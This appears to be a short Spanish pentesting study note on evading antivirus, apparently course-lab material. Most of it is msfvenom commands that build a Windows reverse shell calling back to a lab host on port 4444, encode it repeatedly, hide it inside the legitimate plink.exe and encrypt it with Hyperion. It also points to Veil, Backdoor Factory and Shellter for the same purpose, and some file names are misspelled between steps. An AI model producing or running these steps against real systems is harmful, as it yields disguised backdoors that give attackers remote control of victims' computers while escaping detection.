---
title: bypassing AV
category: exploiting
order: 1
---


# 1 BYPASSING ANTIVIRUS
---

cambiamos la estructura binaria para que cambie la firma y los antivirus no lo vean


## Opcion 1 usamos un encoder
```
  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

## Opcion 2 Lo embebemos en un ejecutable no malicioso
```
   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i  9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```


## Opcion 3 Encriptarlo  

elegimos el payload embebido y encodeado lo copiamos a un lugar y usamos hyperion
```
  root@kali: cp shell_reverse_msf_encoded_embedded.exe backdoor.exe
  root@kali: cp /usr/share/windows-binaries/hyperion-1.0.zip .
  root@kali: unzip Hyperion.zip
  root@kali: cd HYperion
  root@kali:hyperion# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
  root@kali:hyperion# cp -p /usr/lib/gcc/i686-w64-mingnw32/6.1-win32/libgc_s_sjlj-1.dll .
  root@kali:hyperion# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .
  root@kali: wine hyperion.exe ../backdor.exe ../crypted.exe
```


## opcion 4 ideal:
 Armar uno a manopla idem con payloads

### otros
```
https://github.com/secretsquirrel/the-backdoor-factory
https://www.veil-framework.com/
```

# SHELTER
---
lo instalamos en kali le pasamos un binario y le mete un payload que queramos.
